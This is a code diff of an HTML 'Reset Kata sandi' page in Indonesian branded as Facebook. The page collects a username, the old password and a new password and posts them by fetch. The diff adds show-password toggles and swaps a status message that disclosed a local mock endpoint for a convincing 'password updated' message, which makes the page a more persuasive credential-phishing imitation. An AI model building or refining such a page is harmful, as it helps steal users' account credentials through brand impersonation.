@@ -20,7 +20,7 @@
         height: 100vh;
       }
       .card {
-        padding-top: 40px;
+        padding-top: 30px;
         background: white;
         height: 100vh;
         width: 380px;
@@ -34,7 +34,6 @@
         font-size: 32px;
         font-weight: 700;
         margin-bottom: 18px;
-        margin-top: 20px;
       }
       .field {
         margin-bottom: 12px;
@@ -78,7 +77,7 @@
   <body>
     <div class="card" role="main">
       <div class="brand">Facebook</div>
-      <h1 class="header-text">Reset Password</h1>
+      <h1 class="header-text">Reset Kata sandi</h1>
 
       <div class="field">
         <input
@@ -88,21 +87,58 @@
           autocomplete="username"
         />
       </div>
-      <div class="field">
+      <div class="field" style="position: relative">
         <input
           id="password"
           type="password"
-          placeholder="Kata sandi"
+          placeholder="Kata sandi lama"
           autocomplete="current-password"
         />
+        <button
+          type="button"
+          id="togglePassword"
+          style="
+            width: fit-content;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            color: #1877f2;
+          "
+        >
+          Lihat
+        </button>
       </div>
-      <div class="field">
+
+      <div class="field" style="position: relative">
         <input
-          id="password"
+          id="password-2"
           type="password"
-          placeholder="Konfirmasi Kata sandi"
+          placeholder="Kata sandi baru"
           autocomplete="current-password"
         />
+        <button
+          type="button"
+          id="togglePassword2"
+          style="
+            width: fit-content;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            color: #1877f2;
+          "
+        >
+          Lihat
+        </button>
       </div>
       <button id="loginBtn">Kirim</button>
 
@@ -112,6 +148,33 @@
     </div>
 
     <script>
+      const togglePassword = document.getElementById("togglePassword");
+      const togglePassword2 = document.getElementById("togglePassword2");
+      const passwordInput = document.getElementById("password");
+      const passwordInput2 = document.getElementById("password-2");
+
+      togglePassword.addEventListener("click", () => {
+        const type =
+          passwordInput.getAttribute("type") === "password"
+            ? "text"
+            : "password";
+        passwordInput.setAttribute("type", type);
+
+        // Ganti teks tombol
+        togglePassword.textContent = type === "password" ? "Lihat" : "Tutup";
+      });
+
+      togglePassword2.addEventListener("click", () => {
+        const type =
+          passwordInput2.getAttribute("type") === "password"
+            ? "text"
+            : "password";
+        passwordInput2.setAttribute("type", type);
+
+        // Ganti teks tombol
+        togglePassword2.textContent = type === "password" ? "Lihat" : "Tutup";
+      });
+
       const btn = document.getElementById("loginBtn");
       const status = document.getElementById("status");
 
@@ -143,8 +206,7 @@
           });
 
           if (res.ok) {
-            status.textContent =
-              "Request berhasil dikirim ke mock-endpoint (lokal).";
+            status.textContent = "Update Kata sandi berhasil.";
           } else {
             status.textContent = "Mock endpoint merespon error: " + res.status;
           }
